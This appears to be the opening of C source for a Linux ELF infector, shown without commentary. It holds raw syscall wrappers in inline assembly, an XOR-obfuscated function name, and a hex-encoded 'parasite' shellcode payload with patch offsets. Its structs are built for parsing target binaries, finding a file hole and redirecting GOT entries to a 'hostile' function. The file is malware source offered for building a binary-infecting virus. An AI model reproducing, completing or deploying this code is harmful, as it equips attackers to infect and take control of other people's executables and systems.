#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <error.h>
#include <dirent.h>
#include <elf.h>


#define _4KB_PAGE           0x1000
#define _4KB_OFFSET_MASK    0xfff
#define PAGE_SIZE           _4KB_PAGE
#define PAGE_OFFSET_MASK    _4KB_OFFSET_MASK

#define PAGE_ALIGN_LOW(vaddr)    ((vaddr) & ~PAGE_OFFSET_MASK)
#define PAGE_ALIGN_HIGH(vaddr)   (PAGE_ALIGN_LOW(vaddr) + PAGE_SIZE)
#define VADDR_OFFSET(vaddr)      ((vaddr) & PAGE_OFFSET_MASK)


#define PI_MM_ALLOCATED     0x1
#define PI_MM_FREE          0x0
#define PI_MM_POOL_SZ       0x8000
#define PI_POISON_PTR       0x0

#define STRING_EQUAL        0x0
#define STRING_NOT_EQUAL    !STRING_EQUAL

#define MEM_EQUAL           0x0
#define MEM_NOT_EQUAL       !MEM_EQUAL

#define DIRENTS_BUF_SIZE    0x8000


#define PARASITE_ENTRY_SIZE 0x1b
#define PARASITE_OFFSET_1   0x1f
#define PARASITE_OFFSET_2   0x26
#define PARASITE_OFFSET_3   0x2b
#define PARASITE_OFFSET_4   0x50
#define PARASITE_OFFSET_5   0x54
#define PARASITE_LEN        0x60

#define PI_XOR_KEY          0x78

#define PI_OPERATION_SUCCESS  0
#define PI_OPERATION_ERROR   -1

#define PI_SIGNATURE 0x10

#define inline_function __attribute__((always_inline)) inline


#define pi_check_syscall_fault(x)  \
    if ((int64_t)x < 0)            \
        return PI_OPERATION_ERROR  \

/*
 * macro functions to avoid code repeating
*/
#define pi_define_syscall_1(syscall_name,syscall_num,type1,arg1)  \
    int64_t pi_##syscall_name(type1 arg1)                         \
    {                                                             \
        int64_t __ret;                                            \
                                                                  \
        __asm__ volatile                                          \
            (                                                     \
             "movq  %0,%%rdi                    \n"               \
             "movq  $"#syscall_num",%%rax       \n"               \
             "syscall                           \n"               \
             :                                                    \
             : "g" (arg1)                                         \
            );                                                    \
                                                                  \
        __asm__                                                   \
            (                                                     \
             "movq  %%rax,%0"                                     \
             : "=g" (__ret)                                       \
            );                                                    \
                                                                  \
        return __ret;                                             \
    }

#define pi_define_syscall_2(syscall_name,syscall_num,type1,arg1,type2,arg2) \
    int64_t pi_##syscall_name(type1 arg1,type2 arg2)                        \
    {                                                                       \
        int64_t __ret;                                                      \
                                                                            \
        __asm__ volatile                                                    \
            (                                                               \
             "movq  %0,%%rdi                    \n"                         \
             "movq  %1,%%rsi                    \n"                         \
             "movq  $"#syscall_num",%%rax       \n"                         \
             "syscall"                                                      \
             :                                                              \
             : "g" (arg1), "g" (arg2)                                       \
            );                                                              \
                                                                            \
        __asm__                                                             \
            (                                                               \
             "movq  %%rax,%0"                                               \
             : "=g" (__ret)                                                 \
            );                                                              \
                                                                            \
        return __ret;                                                       \
    }

#define pi_define_syscall_3(syscall_name,syscall_num,type1,arg1,type2,arg2,type3,arg3)  \
    int64_t pi_##syscall_name(type1 arg1,type2 arg2,type3 arg3)                         \
    {                                                                                   \
        int64_t __ret;                                                                  \
                                                                                        \
        __asm__ volatile                                                                \
            (                                                                           \
             "movq  %0,%%rdi                    \n"                                     \
             "movq  %1,%%rsi                    \n"                                     \
             "movq  %2,%%rdx                    \n"                                     \
             "movq  $"#syscall_num",%%rax       \n"                                     \
             "syscall"                                                                  \
             :                                                                          \
             : "g" (arg1), "g" (arg2), "g" (arg3)                                       \
            );                                                                          \
                                                                                        \
        __asm__                                                                         \
            (                                                                           \
             "movq  %%rax,%0"                                                           \
             : "=g" (__ret)                                                             \
            );                                                                          \
                                                                                        \
        return __ret;                                                                   \
    }



char fclose_xor_encoded[] = "\x1e\x1b\x14\x17\x0b\x1d";


char parasite[] = 
    "\x50\x53\x57\x56\x52\x51\x55"
    "\x48\x31\xc0"
    "\x48\x31\xdb"
    "\x48\x31\xd2"
    "\x48\x31\xc9"
    "\x48\x31\xed"
    "\xe8\x41\x00\x00\x00"
    "\x5f"
    "\x48\x81\xef\x41\x41\x41\x41" 
    "\x48\x81\xc7\x43\x43\x43\x43"
    "\xbe\x42\x42\x42\x42"
    "\xba\x01\x00\x00\x00"
    "\x48\x83\xca\x02"
    "\x48\x83\xca\x04"
    "\xb8\x0a\x00\x00\x00"
    "\x0f\x05"
    "\xe8\x16\x00\x00\x00"
    "\x58"
    "\x48\x83\xc0\x18"
    "\x48\x89\x05\x0c\x00\x00\x00"
    "\x5d\x59\x5a\x5e\x5f\x5b\x58\xc3"
    "\xeb\xbd"
    "\xeb\xe8";


typedef struct start_args
{
#define DUMMY_SIZE 8 //force arguments to be on stack 
    char *argv[DUMMY_SIZE]; 
}start_args_t;

typedef struct malloc_header
{
    uint32_t stat;
    uint32_t size;
    struct malloc_header *next;
}malloc_header_t;


typedef struct mman
{
    uint8_t *mm_pool_start;
    uint8_t *mm_pool_end;
    uint8_t *mm_cur_brk;
    malloc_header_t *malloc_head;
}mman_t;

typedef struct linux_dirent64
{
    uint64_t d_ino;
    uint64_t d_off;
    uint16_t d_reclen;
    uint8_t  d_type;
    char     d_name[];
}linux_dirent64_t;

typedef struct targetfunc
{
    uint64_t func_got;
    uint64_t func_name_len;
    uint8_t  *func_name;
}targetfunc_t;

typedef struct hostilefunc
{
    uint64_t hostile_addr;
    uint64_t hostile_len;
}hostilefunc_t;


typedef struct elfstructs
{
    Elf64_Ehdr      *ehdr;
    Elf64_Phdr      *phdr;
    Elf64_Phdr      *textphdr;
    Elf64_Shdr      *shdr;
    Elf64_Sym       *dyn_symtab;
    Elf64_Dyn       *dynseg;
    Elf64_Rela      *rela;
    Elf64_Addr      *pltgot;
    Elf64_Rela      *pltrela;
    Elf64_Xword     relasz;
    Elf64_Xword     pltrelsz;
    Elf64_Addr      *initarray;
    Elf64_Addr      gnureloc_start;
    Elf64_Xword     gnureloc_sz;
    uint8_t         *dyn_strtab;
}elfstructs_t;


typedef struct loadsegments
{
    Elf64_Addr      code_vaddr;
    Elf64_Addr      data_vaddr;
    Elf64_Off       code_offset;
    Elf64_Off       data_offset;
    Elf64_Xword     code_size;
    Elf64_Xword     data_size;
}loadsegments_t;


typedef struct elf_flags
{
    uint64_t    bind_now;
}elf_flags_t;


typedef struct target_elf
{
    const char      *name;
    uint8_t         *mmap;
    int64_t         fd;
    uint64_t        filehole;
    elfstructs_t    elfstructs;
    loadsegments_t  loadsegments;
    hostilefunc_t   hostilefunc;
    targetfunc_t    targetfunc;
    elf_flags_t     elf_flags;
    struct stat     stat;
}target_elf_t;



target_elf_t *target_elf;
mman_t mman;
